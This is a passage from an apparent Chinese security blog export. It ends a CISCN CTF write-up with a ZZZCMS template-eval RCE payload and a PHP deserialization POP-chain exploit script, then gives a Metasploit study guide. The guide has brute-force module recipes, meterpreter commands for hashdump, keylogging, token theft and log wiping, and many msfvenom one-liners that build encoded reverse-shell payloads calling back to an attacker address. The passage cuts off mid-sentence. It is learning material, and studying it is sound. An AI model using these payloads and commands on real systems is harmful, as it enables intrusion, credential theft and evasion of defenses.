|| $arr[1]==''){ \n                    die('很抱歉，模板中有错误的判断,请修正【'.$ifstr.'】'); \n                } \n                $ifstr = str_replace( '=', '==', $ifstr ); \n            } \n            $ifstr = str_replace( '<>', '!=', $ifstr ); \n            $ifstr = str_replace( 'or', '||', $ifstr ); \n            $ifstr = str_replace( 'and', '&&', $ifstr ); \n            $ifstr = str_replace( 'mod', '%', $ifstr ); \n            $ifstr = str_replace( 'not', '!', $ifstr ); \n            if ( preg_match( '/\\{|}/', $ifstr)) { \n                die('很抱歉，模板中有错误的判断,请修正'.$ifstr); \n            }else{ \n                @eval( 'if(' . $ifstr . '){$flag=\"if\";}else{$flag=\"else\";}' ); \n            } \n \n            if ( preg_match( '/([\\s\\S]*)?\\{else\\}([\\s\\S]*)?/', $matches[ 2 ][ $i ], $matches2 ) ) { \n                switch ( $flag ) { \n                    case 'if': \n                        if ( isset( $matches2[ 1 ] ) ) { \n                            $out_html .= $matches2[ 1 ]; \n                        } \n                        break; \n                    case 'else': \n                        if ( isset( $matches2[ 2 ] ) ) { \n                            $out_html .= $matches2[ 2 ]; \n                        } \n                        break; \n                } \n            } elseif ( $flag == 'if' ) { \n                $out_html .= $matches[ 2 ][ $i ]; \n            } \n            $pattern2 = '/\\{if([0-9]):/'; \n            if ( preg_match( $pattern2, $out_html, $matches3 ) ) { \n                $out_html = str_replace( '{if' . $matches3[ 1 ], '{if', $out_html ); \n                $out_html = str_replace( '{else' . $matches3[ 1 ] . '}', '{else}', $out_html ); \n                $out_html = str_replace( '{end if' . $matches3[ 1 ] . '}', '{end if}', $out_html ); \n                $out_html = $this->parserIfLabel( $out_html ); \n            } \n            $content = str_replace( $matches[ 0 ][ $i ], $out_html, $content ); \n        } \n    } \n    return $content; \n} \nfunction splits( $s, $str=',' ) { \n    if ( empty( $s ) ) return array( '' ); \n    if ( strpos( $s, $str ) !== false ) { \n        return explode( $str, $s ); \n    } else { \n        return array( $s ); \n    } \n}\n```\n\n搜索发现是ZZZCMS源码的一部分\n\n参考：[[zzzcms(php) v1.7.5 前台RCE-复现](https://forum.90sec.com/t/topic/1239)](https://cloud.tencent.com/developer/article/1576196)\n\n**Payload:**\n\n```php\n?a={if:print_r(`ls /`)}{end if}\n?a={if:print_r(`cat /flag`)}{end if}\n```\n\n![](https://img.jwt1399.top//img/20200825110523.png)\n\n## babyunserialize\n\n**考点：pop chain构造、反序列化gadget串联**\n\n使用御剑进行目录扫描发现`www.zip`，存在源码泄露,打开后发现是fatfree框架，进行代码审计\n\nPHP路由：\n\n```php\n$f3->route('GET /',\n    function($f3) {\n        echo \"may be you need /?flag=\";\n    }\n);\nunserialize($_GET['flag']);\n```\n\n发现题目给了一个反序列化位置，且参数可控。\n\n做了很久都没思路，搜到[2020WMCTF-webweb](https://www.4hou.com/posts/vD7X)类似的题,但是还是没做出来，队友最后给的构造方法。\n\n```php\n<?php\nnamespace DB\\SQL {\n    class Mapper {\n        protected $props;\n        function __construct($props)\n        {\n            $this->props = $props;\n        }\n    }\n}\n\nnamespace CLI {\n    class Agent{\n        protected $server;\n        protected $socket;\n        function __construct($server,$socket)\n        {\n            $this->server = $server;\n            $this->socket= $socket;\n        }\n\n    }\n\n    class WS{\n        protected $events = [];\n        function __construct($events)\n        {\n            $this->events = $events;\n        }\n    }\n}\n\nnamespace {\n    class Image{\n        public $events = [];\n        function __construct($events)\n        {\n            $this->events = $events;\n        }\n    }\n\n    $a = new DB\\SQL\\Mapper(array(\"write\"=>\"create_function\"));\n    $b= new CLI\\Agent($a,'){}readfile(\"/tmp/ffff1l1l1a449g\");//');\n    $c = new Image(array(\"disconnect\"=>array($b,'send')));\n    $d = new CLI\\Agent($c,'');\n    $e = new CLI\\WS($d);\n    echo urlencode(serialize($e)).\"\\n\";\n}\n?>\n```\n\n**EXP：**\n\n```python\nimport requests\n\nurl = 'http://eci-2ze4mvter6u3r6rigbk1.cloudeci1.ichunqiu.com/?flag='\npayload = 'O%3A6%3A%22CLI%5CWS%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3BO%3A5%3A%22Image%22%3A1%3A%7Bs%3A6%3A%22events%22%3Ba%3A1%3A%7Bs%3A10%3A%22disconnect%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22CLI%5CAgent%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00server%22%3BO%3A13%3A%22DB%5CSQL%5CMapper%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00props%22%3Ba%3A1%3A%7Bs%3A5%3A%22write%22%3Bs%3A15%3A%22create_function%22%3B%7D%7Ds%3A9%3A%22%00%2A%00socket%22%3Bs%3A37%3A%22%29%7B%7Dreadfile%28%22%2Ftmp%2Fffff1l1l1a449g%22%29%3B%2F%2F%22%3B%7Di%3A1%3Bs%3A4%3A%22send%22%3B%7D%7D%7Ds%3A9%3A%22%00%2A%00socket%22%3Bs%3A0%3A%22%22%3B%7D%7D'\nurl_all = url+payload\nr = requests.get(url_all)\nprint (r.content)\n```\n\n![](https://img.jwt1399.top//img/20200825115752.png)\n\n## littlegame\n\n这道题没有做出来。。。\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["Write-up","CISCN"],"categories":["CTF"]},{"title":"Metasploit 学习记录","url":"/posts/42826.html","content":"\n一直在用 Metasploit，但是从来没有花时间仔细去研究这个工具，最近得空就系统的研究研究，故于此记录之。\n\n## 简介\n\nMetasploit是一款开源的渗透测试框架平台，MSF已经内置了数千个已披露的漏洞相关的模块和渗透测试工具，模块使用ruby语言编写。\n\n官网：https://www.metasploit.com/\n\n## Metasploit体系框架\n\n### 体系框架图\n\n![Metasploit体系框架](https://img.jwt1399.top//img/20200811215048.png)\n\n\n\n### **基础库文件**\n\n> Metasploit基础库文件位于源码根目录路径下的 `libraries` 目录中，包括 `Rex`，`framework-core`和`framework-base` 三部分。\n\n- **Rex（Ruby extension）：**是整个框架所依赖的最基础的一些组件，为开发者进行框架和模块开发提供了一些基础功能的支持，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、PostgreSQL以及MySQL数据库支持等；\n- **framework-core：** 负责实现所有与各种类型的上层模块及插件的交互接口；\n- **framework-base：** 扩展了framework-core，提供更加简单的包装例程，并为处理框架各个方面的功能提供了一些功能类，用于支持用户接口与功能程序调用框架本身功能及框架集成模块；\n\n### **模块**\n\n> 模块是通过Metasploit框架所装载、集成并对外提供的最核心的渗透测试功能实现代码。分为`辅助模块(Aux)`、`渗透攻击模块(Exploits)`、`后渗透攻击模块(Post)`、`攻击载荷模块(payloads)`、`编码器模块(Encoders)`、`空指令模块(Nops)`。这些模块拥有非常清晰的结构和一个预定义好的接口，并可以组合支持信息收集、渗透攻击与后渗透攻击拓展。\n\n- **辅助模块(Aux)：**　在渗透信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令猜测等模块。\n\n- **渗透攻击模块(Exploits)：**利用发现的安全漏洞和配置弱点对远程目标系统进行攻击，植入运行攻击载荷，从而获得对远程目标系统访问权的代码组件。\n\n- **攻击载荷模块(payloads)：**在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开在目标系统上的控制会话连接。\n- **空指令模块(Nops)：**用来在攻击载荷中添加空指令区， 以提高攻击可靠性的组件。\n\n- **编码器模块(Encoders)：**攻击载荷与空指令模块组装完成一个指令序列后，进行编码，来绕过防护软件拦截。\n\n- **后渗透攻击模块(Post)：**在渗透攻击取得目标系统远程控制权之后，在受控系统中进行各种各样的后渗透攻击动作，比如获取敏感信息，进一步括展，实施跳板攻击等。\n- **躲避模块(Evasion)：**5.0新增的模块，这个模块可以轻松的创建反杀毒软件的木马。\n\n### **插件**\n\n　　插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如 Nessus、OpenVAS 漏洞扫描器等，为用户接口提供一些新的功能。\n\n### **接口**\n\n　　包括 msfconsole 控制终端、msfcli 命令行、msfgui 图形化界面、armitage 图形化界面以及 msfapi 远程调用接口等。\n\n### **功能程序**\n\n　　除了用户使用用户接口访问 metasploit 框架主体功能之外，metasploit 还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速地利用 metasploit 框架内部能力完成一些特定任务。比如 `msfpayload`、`msfencode` 和 `msfvenom` 可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码。`msf*scan`系列功能程序提供了在PE、ELF等各种类型文件中搜索特定指令的功能，可以帮助渗透代码开发人员定位指令地址。\n\n## Metasploit目录结构\n\n目录地址：`/usr/share/metasploit-framework/`\n\n最重要的目录是data，modules，scripts，tools，plugins\n\n![主目录](https://img.jwt1399.top//img/20200812115104.png)\n\n### data目录\n\n存放meterpreter，exploits，wordlists等。\n\n![data目录](https://img.jwt1399.top//img/20200812115104.png)\n\n**meterpreter**是msf的攻击载荷，使用于后渗透阶段\n\n**exploits**里面则存放了许多的cve漏洞利用代码\n\n**wordlists**里面放的是字典文件\n\n### modules目录\n\nmetasploit的核心目录了，存放着各个攻击模块\n\n![modules目录](https://img.jwt1399.top//img/20200812115053.png)\n\n### scirpts目录\n\n存放一些msf用到的脚本文件，分别是meterpreter，ps，resource，shell\n\n![scirpts目录](https://img.jwt1399.top//img/20200812115348.png)\n\n### tools目录\n\n存放各种可使用的工具\n\n![tools目录](https://img.jwt1399.top//img/20200812164726.png)\n\n### plugins目录\n\n存放msf的各种插件\n\n![plugins目录](https://img.jwt1399.top//img/20200812164729.png)\n\n## Metasploit命令篇\n\n### **MSF启动**\n\n方法一：\n\n```bash\nsudo msfdb init && msfconsole\n```\n\n方法二：\n\n- 1.开启数据库：service start postgresql \n\n- 2.设置数据库开机启动：service enable postgresql \n\n- 3.初始化MSF数据库：msfdb init　　　　[初次使用需要初始化]\n\n- 4.开启MSF：msfconsole\n\n- 5.查看数据库连接状态：db_status\n\n启动完成后会有一些统计信息，比如说版本号，有多少个 exploits，多少个 payloads 等。\n\n![](https://img.jwt1399.top//img/20200812171940.png)\n\n### 常用命令\n\n通过 `help` 查看帮助，可以对 msf 有个整体认识，可以看到 msf 相关命令可以分成以下类型：\n\n| Core Commands                | 核心命令          |\n| ---------------------------- | ----------------- |\n| Module Commands              | 模块命令          |\n| Job Commands                 | 后台任务命令      |\n| Resource Script Commands     | 资源脚本命令      |\n| Database Backend Commands    | 数据库后端命令    |\n| Credentials Backend Commands | 证书/凭证后端命令 |\n| Developer Commands           | 开发人员命令      |\n\n 待更。。。\n\n## Metasploit爆破篇\n\n### 爆破TELNET\n\n```bash\nmsf > use auxiliary/scanner/telnet/telnet_login \nmsf auxiliary(telnet_login) > set RHOSTS 192.168.1.103\nmsf auxiliary(telnet_login) > set STOP_ON_SUCCESS true #爆破成功就停止\nmsf auxiliary(telnet_login) > set VERBOSE true #打印输出\nmsf auxiliary(telnet_login) > set USER_FILE /root/Desktop/username.txt\nmsf auxiliary(telnet_login) > set PASS_FILE /root/Desktop/password.txt\nmsf auxiliary(telnet_login) > exploit \n```\n\n### 爆破SSH\n\n```bash\nmsf > use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) > set RHOSTS 192.168.1.103\nmsf auxiliary(ssh_login) > set STOP_ON_SUCCESS true #爆破成功就停止\nmsf auxiliary(ssh_login) > set VERBOSE true #打印输出\nmsf auxiliary(ssh_login) > set USER_FILE /root/Desktop/username.txt\nmsf auxiliary(ssh_login) > set PASS_FILE /root/Desktop/password.txt\nmsf auxiliary(ssh_login) > set THREADS 50\nmsf auxiliary(ssh_login) > run\n```\n\n### 爆破MYSQL\n\n```bash\nmsf > use  auxiliary/scanner/mysql/mysql_login\nmsf auxiliary(mysql_login) > set RHOSTS  192.168.1.103\nmsf auxiliary(mysql_login) > set STOP_ON_SUCCESS true #爆破成功就停止\nmsf auxiliary(mysql_login) > set VERBOSE true #打印输出\nmsf auxiliary(mysql_login) > set USER_FILE /root/Desktop/username.txt\nmsf auxiliary(mysql_login) > set PASS_FILE /root/Desktop/password.txt\nmsf auxiliary(mysql_login) > run\n```\n\n### 爆破FTP\n\n```bash\nmsf > use auxiliary/scanner/ftp/ftp_login\nmsf auxiliary(ftp_login) > set RHOSTS  192.168.1.103\nmsf auxiliary(ftp_login) > set STOP_ON_SUCCESS true #爆破成功就停止\nmsf auxiliary(ftp_login) > set VERBOSE true #打印输出\nmsf auxiliary(ftp_login) > set USERNAME msfadmin\nmsf auxiliary(ftp_login) > set PASS_FILE /root/Desktop/password.txt\nmsf auxiliary(ftp_login) > run\n```\n\n### 爆破postgressql数据库\n\n```bash\nmsf > use auxiliary/scanner/postgres/postgres_login  \nmsf auxiliary(postgres_login) > set RHOSTS  192.168.1.103\nmsf auxiliary(postgres_login) > set STOP_ON_SUCCESS true #爆破成功就停止\nmsf auxiliary(postgres_login) > set VERBOSE true #打印输出\nmsf auxiliary(postgres_login) > set USER_FILE /root/Desktop/username.txt\nmsf auxiliary(postgres_login) > set PASS_FILE /root/Desktop/password.txt\nmsf auxiliary(postgres_login) > run\n```\n\n## meterpreter\n\n### 常用命令\n\n```bash\n　run scriptname       运行Meterpreter脚本，在scripts/meterpreter目录下可查看所有的脚本名。\n  sysinfo                    列出受控主机的系统信息。\n  ls                             列出目标主机的文件和文件夹信息。\n  use priv                    加载特权提升扩展模块，来扩展Meterpreter库。\n  ps                            显示所有运行进程以及关联的用户账号。\n  migrate PID               迁移到一个指定的进程ID(PID可通过ps从目标主机上获得）。\n  use incognito             加载incognito功能（用来盗窃目标主机的令牌或是假冒用户).\n  list_tokens -u            列出目标主机用户的可用令牌。\n  list_tokens -g            列出目标主机用户组的可用令牌。\n  impersonate_token DOMAIN_NAME\\\\USERNAME             假冒目标主机上的可用令牌。\n  steal_token PID          盗窃给定进程的可用令牌并进行令牌假冒。\n  drop_token                停止假冒当前令牌。\n  getsystem                  通过各种攻击向量来提升系统用户权限。\n  shell                          以所有可用令牌来运行一个交互的shell。\n  execute -f cmd.exe -i  执行cmd.exe命令并进行交互。\n execute -f cmd.exe -i -t 以所有可用的令牌来执行cmd命令。\n  execute -f cmd.exe -i -H -t  以所有可用的令牌来执行cmd命令并隐藏该进程。\n  rev2self                      回到控制目标主机的初始化用户账号下。\n  reg command              在目标主机注册表中进行交互，创建，删除，查询等操作。\n  setdesktop number      切换到另一个用户界面（该功能基于哪些用户已登录）。\n  screenshot                  对目标主机的屏幕进行截图。\n  upload file                   向目标主机上传文件\n  download file               从目标主机下载文件。\n  keyscan_start             针对远程目标主机开启键盘记录功能。\n  keyscan_dump            存储目标主机上捕获的键盘记录。\n  keyscan_stop              停止针对目标主机的键盘记录功能。\n  getprivs                      尽可能多的获取目标主机上的特权。\n  uictl enable keyboard/mouse     接管目标主机的键盘和鼠标。\n  background                 将你当前的Meterpreter shell转为后台执行。\n  hashdump                   导出目标主机中的口令哈希值。\n  use sniffer                   加载嗅探模块。\n  sniffer_interfaces          列出目标主机所有开放的网络接口。\n  sniffer_dump interfaceID pcapname        在目标主机上启动嗅探。\n  sniffer_stats interfaceID  获取正在实施嗅探网络接口的统计数据。\n  sniffer_start interfaceID packet-buffer  在目标主机上针对特定范围的数据包缓冲区启动嗅探。\n  sniffer_stop interfaceID 停止嗅探。\n  add_user username password -h ip   在远程目标主机上添加一个用户。\n  add_group_user \"Domain Admins\" username -h ip     将用户添加到目标主机的域管理员组中。\n  clearev                        清除目标主机上的日志记录。\n  timestomp                   修改文件属性，例如修改文件的创建时间（反取证调查）。\n  reboot                         重启目标主机。\n```\n\n### meterpreter中文乱码\n\n#### 成因\n\nLinux下面汉字默认是UTF-8编码\nWindows下汉字使用的是GBK系列编码\n\n#### 解决方案\n\n方法一：直接执行 `chcp 65001` 命令\n\n方法二：将终端临时设置为`GBK`系列编码即可\n\n## msfvenom\n\n> **msfvenom **是 `msfpayload` 和 `msfencode` 的结合体，可利用 msfvenom 生成木马程序,并在目标机上执行,在本地监听上线\n\n### msfvenom参数\n\n查看帮助参数的命令`msfvenom -h`\n\n```bash\nOptions:\n    -l, --list            <type>        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等\n    -p, --payload         <payload>     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取\n        --list-options                  # 列出--payload <value> 的标准，高级和规避选项\n    -f, --format          <format>      # 指定 Payload 的输出格式(使用 --list formats 列出)\n    -e, --encoder         <encoder>     # 指定使用的 Encoder (使用 --list encoders 列出)\n        --sec-name        <value>       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串\n        --smallest                      # 使用所有可用的编码器生成最小的payload\n        --encrypt         <value>       # 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)\n        --encrypt-key     <value>       # 用于加密的密钥\n        --encrypt-iv      <value>       # 加密的初始化向量\n    -a, --arch            <arch>        # 指定目标系统架构(使用 --list archs  列出)\n        --platform        <platform>    # 指定目标系统平台 (使用 --list platforms 列出)\n    -o, --out             <path>        # 保存payload到文件\n    -b, --bad-chars       <list>        # 设置需要在 Payload 中避免出现的字符，如： '\\x00\\xff'\n    -n, --nopsled         <length>      # 指定 nop 在 payload 中的数量\n    -s, --space           <length>      # 设置未经编码的 Payload 的最大长度\n        --encoder-space   <length>      # 编码后的 Payload 的最大长度\n    -i, --iterations      <count>       # 设置 Payload 的编码次数\n    -c, --add-code        <path>        # 指定包含一个额外的win32 shellcode文件\n    -x, --template        <path>        # 指定一个特定的可执行文件作为模板\n    -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行\n    -v, --var-name        <value>       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）\n    -t, --timeout         <second>      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）\n    -h, --help                          # 帮助\n```\n\n### msfvenom生成Payload\n\n```bash\n#普通生成\nmsfvenom -p <payload> <payload options> -f <format> -o <path>\nmsfvenom -p windows/meterpreter/reverse_tcp  -f exe -o payload.exe\n\n#编码生成\nmsfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 lhost=攻击机IP lport=攻击机端口 -e 编码方式  -i 编码次数 -f 输出格式 -o 输出文件\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=12345 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe\n```\n\n```bash\nmsfvenom -l archs\t\t#查看支持的系统架构\nmsfvenom -l platforms\t#查看支持系统平台\nmsfvenom -l payload    \t\t#列出所有可用的payload\nmsfvenom -l formats    \t\t#列出所有的输出格式\nmsfvenom -l encrypt    \t\t#列出所有的加密方式\nmsfvenom -l encoders   \t\t#列出所有的编码器\n```\n\n### 创建监听器\n\n等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例\n\n```bash\nmsf > use exploit/multi/handler\nmsf > set payload windows/meterpreter/reverse_tcp\nmsf > set lport 12345   #也可以使用默认的4444端口\nmsf > set lhost 192.168.1.101\nmsf > exploit\n```\n\n### 各类OS系统的payload\n\n#### windows 平台\n\n普通的exe 直接双击即可触发,会弹回一个常规meterpreter\n\n```bash\nmsfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.52.128 LPORT=12345 -e x86/shikata_ga_nai -b '\\x00\\x0a\\xff' -i 3 -f exe -o x86_shell.exe\n```\n\npowershell，把文件中编码后的powershell payload代码直接抠出来,丢到目标机器的cmd中去执行触发,会弹回一个powershell的shell\n\n```bash\nmsfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1\n```\n\n#### linux 平台\n\n直接赋予执行权限,执行即可触发\n\n```bash\nmsfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f elf -o x86_shell.elf\n```\n\n#### mac 平台\n\n```bash\nmsfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f macho -o x86_shell.macho\n```\n\n#### android平台\n\n注意这里生成的apk是不能直接被装到手机上的,还需要你自己给apk签个名才能装,装完以后点击打开即可触发\n\n```bash\nmsfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f apk -o x86_shell.apk\n```\n\n### 各类web的Payload\n\n基于脚本,对于此类的web脚本触发执行方法非常简单,直接在url中访问该脚本即可\n\n#### php 脚本\n\n```bash\nmsfvenom --platform PHP -p php/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.php\n```\n\n#### asp 脚本\n\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f asp -o shell.asp\n```\n\n#### aspx 脚本\n\n```bash\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f aspx -o x86_shell.aspx\n```\n\n#### jsp 脚本\n\n```bash\nmsfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.jsp\n```\n\n#### war包\n\n找个能部署war包的地方,如各类java控制台,部署一下即可执行\n\n```bash\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.war\n```\n\n### 各类脚本的payload\n\n#### nodejs\n\n```bash\nmsfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.js\n```\n\n#### python\n\n```bash\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.py\n```\n\n#### perl\n\n```bash\nmsfvenom -p cmd/unix/reverse_perl LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.pl\n```\n\n#### ruby\n\n```bash\nmsfvenom -p ruby/shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.rb\n```\n\n#### lua\n\n```bash\nmsfvenom -p cmd/unix/reverse_lua LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.lua\n```\n\n#### bash\n\n```bash\nmsfvenom -p cmd/unix/reverse_bash LHOST=192.168.3.12 LPORT=12345 -f raw -o shell.sh\n```\n\n**参考：**\n\n- [Metasploit——msfvenom免杀木马](https://blog.csdn.net/weixin_44677409/article/details/96346481)\n- [msfvenom进阶](https://klionsec.github.io/2017/03/08/msfvenom-advanced/)\n- [远控免杀专题文章(2)-msfvenom隐藏的参数](https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w)\n\n## Metasploit信息收集篇\n\n基于TCP协议收集主机信息\n\n### 主机信息收集\n\n使用`auxiliary/scanner/discovery/`下模块进行扫描\n\n```bash\nuse auxiliary/scanner/discovery/arp_sweep #发现存活的主机\nuse auxiliary/scanner/discovery/empty_udp\nuse auxiliary/scanner/discovery/ipv6_multicast_ping\nuse auxiliary/scanner/discovery/ipv6_neighbor\nuse auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement\nuse auxiliary/scanner/discovery/udp_probe\nuse auxiliary/scanner/discovery/udp_sweep #除了可以探测到存活主机之外，还可以获得主机名称信息\n```\n\n**实例：使用arp_sweep模块来发现存活的主机**\n\n```bash\nsearch arp_sweep       #查询此模块下的攻击模块\nuse   查询出来的攻击模块  #加载攻击模块\nshow options           #查看一下该模块需要配置的选项参数\nset RHOSTS 目标机ip     #使用set命令将RHOSTS设置为目标电脑的IP\nexploit                #进行攻击\n```\n\n### 主机端口扫描\n\n使用`auxiliary/scanner/portscan/`下的模块探测主机端口\n\n```bash\nauxiliary/scanner/portscan/ack       #ACK防火墙扫描\nauxiliary/scanner/portscan/ftpbounce #FTP跳端口扫描\nauxiliary/scanner/portscan/syn       #SYN端口扫描(半连接扫描)\nauxiliary/scanner/portscan/tcp       #TCP端口扫描\nauxiliary/scanner/portscan/xmas      #TCP”XMas”端口扫描\n```\n\n### SMB扫描\n\n> SMB(全称是Server Message Block)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。基于SSH协议收集信息，端口：`139`、`445`\n\n使用`auxiliary/scanner/smb/`下的模块进行SMB相关操作\n\n```bash\nauxiliary/scanner/smb/pipe_auditor \t\t    #扫描命名管道\nauxiliary/scanner/smb/pipe_dcerpc_auditor    #返回DCERPC信息\nauxiliary/scanner/smb/psexec_loggedin_users  \nauxiliary/scanner/smb/smb2                   #扫描SMB2协议\nauxiliary/scanner/smb/smb_enum_gpp           \nauxiliary/scanner/smb/smb_enumshares         #扫描smb共享文件\nauxiliary/scanner/smb/smb_enumusers          #smb枚举系统用户\nauxiliary/scanner/smb/smb_enumusers_domain   \nauxiliary/scanner/smb/smb_login              #SMB登录\nauxiliary/scanner/smb/smb_lookupsid          #扫描组的用户\nauxiliary/scanner/smb/smb_uninit_cred        \nauxiliary/scanner/smb/smb_version            #扫描系统版本\n```\n\n**实例：使用 smb_version 基于 SMB 协议扫描版本号 **\n\n```bash\nmsf5 > use auxiliary/scanner/smb/smb_version \n#设置扫描目标，注意多个目标使用逗号+空格隔开 \nmsf5 auxiliary(scanner/smb/smb_version) > show options \nmsf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.56, 192.168.1.180  \n#注： 192.168.1.56 后面的逗号和 192.168.1.180 之间是有空格的 \nmsf5 auxiliary(scanner/smb/smb_version) > run \n```\n\n扫描出来操作系统的版本号\n\n![](https://img.jwt1399.top//img/20200813104251.png)\n\n### SSH探测扫描\n\n使用`auxiliary/scanner/ssh/`下的模块探测ssh信息\n\n```bash\nauxiliary/scanner/ssh/cerberus_sftp_enumusers\nauxiliary/scanner/ssh/detect_kippo\nauxiliary/scanner/ssh/ssh_enumusers     #枚举用户\nauxiliary/scanner/ssh/ssh_identify_pubkeys\nauxiliary/scanner/ssh/ssh_login         #密码爆破\nauxiliary/scanner/ssh/ssh_login_pubkey\nauxiliary/scanner/ssh/ssh_version       #查看版本\n```\n\n### FTP探测扫描\n\n使用`auxiliary/scanner/ftp/`下的模块探测ftp信息\n\n```bash\nauxiliary/scanner/ftp/anonymous         #匿名登录扫描\nauxiliary/scanner/ftp/bison_ftp_traversal\nauxiliary/scanner/ftp/ftp_login         #密码爆破\nauxiliary/scanner/ftp/ftp_version       #查看版本\nauxiliary/scanner/ftp/konica_ftp_traversal\nauxiliary/scanner/ftp/pcman_ftp_traversal\nauxiliary/scanner/ftp/titanftp_xcrc_traversal\n```\n\n### MYSQL探测扫描\n\n使用`auxiliary/scanner/mysql/`下的模块探测mysql信息\n\n```bash\nauxiliary/scanner/mysql/mysql_authbypass_hashdump\nauxiliary/scanner/mysql/mysql_file_enum\nauxiliary/scanner/mysql/mysql_hashdump   #dump密码hash\nauxiliary/scanner/mysql/mysql_login      #密码爆破\nauxiliary/scanner/mysql/mysql_schemadump\nauxiliary/scanner/mysql/mysql_version    #查看版本\n```\n\n### SQLSERVER探测扫描\n\n使用`auxiliary/scanner/mssql/`下的模块探测SQL server的信息\n\n```bash\nauxiliary/scanner/mssql/mssql_hashdump  #dump密码hash\nauxiliary/scanner/mssql/mssql_login     #密码爆破\nauxiliary/scanner/mssql/mssql_ping      #嗅探\nauxiliary/scanner/mssql/mssql_schemadump\n```\n\n### **SNMP扫描**\n\n> 简单网络管理协议（[SNMP](https://baike.baidu.com/item/SNMP/133378)） 是专门设计用于在 IP 网络管理[网络节点](https://baike.baidu.com/item/网络节点/9338583)（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议，SNMP 使网络管理员能够管理网络效能，发现并解决网络问题以及规划网络增长。通过 SNMP 接收随机消息（及事件报告）网络管理系统获知网络出现问题。端口：`161`\n\n使用`auxiliary/scanner/snmp/`下的模块探测 SNMP 的信息\n\n```bash\nuse auxiliary/scanner/snmp/snmp_login #确定SNMP设备团体字符串的模块。\nuse auxiliary/scanner/snmp/snmp_enum  #主机的枚举\nuse auxiliary/scanner/snmp/snmp_enumusers （windows） #收集在远程系统上的用户名的列表。\nuse auxiliary/scanner/snmp/snmp_enumshares （windows）#查询范围的主机，以确定任何可用的共享。\n```\n\n**实例**:\n\n1、先到 Metasploitable2-Linux 主机上修改一下 SNMP 服务，因为默认服务是不对外开放的。 \n\n```bash\nmsfadmin@metasploitable:~# sudo vim  /etc/default/snmpd \n#修改第11行，侦听地址修改为0.0.0.0 \nSNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1' \n修改为： \nSNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0'  \n#重启 SNMP 服务 \nmsfadmin@metasploitable:~$ sudo /etc/init.d/snmpd restart \n#确认服务监听正常 \nmsfadmin@metasploitable:~$ netstat -antup | grep 161 \n(No info could be read for \"-p\": geteuid()=1000 but you should be root.) \nudp        0      0 0.0.0.0:161             0.0.0.0:*    \n```\n\n2、使用 snmp_enum 模块通过 